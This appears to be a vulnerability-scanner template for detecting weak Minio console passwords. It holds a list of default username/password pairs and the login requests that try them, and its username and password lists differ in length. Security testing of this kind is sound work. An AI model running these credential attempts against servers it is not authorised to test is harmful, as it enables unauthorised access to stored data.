id: yaml-poc-minio-minio-weak_password-CT-158034
info:
  name: Minio Weak Password Detection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Detects weak passwords in Minio API by attempting login with known default credentials.
http:
  - name: check-login-strategy
    method: GET
    path:
      - '{{BaseURL}}/api/v1/login'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"loginStrategy":'
  - name: weak-password-test
    method: POST
    path:
      - '{{BaseURL}}/api/v1/login'
    headers:
      Content-Type: application/json
    body: '{"accessKey":"{{username}}","secretKey":"{{password}}"}'
    payloads:
      username:
        - minioadmin
        - admin
        - minio
        - admin
        - user
        - admin
        - minio
        - minio
        - minio
      password:
        - minioadmin
        - 12345678
        - miniostorage
        - password
        - password
        - admin123
        - miniominio
        - minio123
    attack: pitchfork
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - 'Set-Cookie: token='
      - type: word
        part: body
        negative: true
        words:
          - "invalid Login"
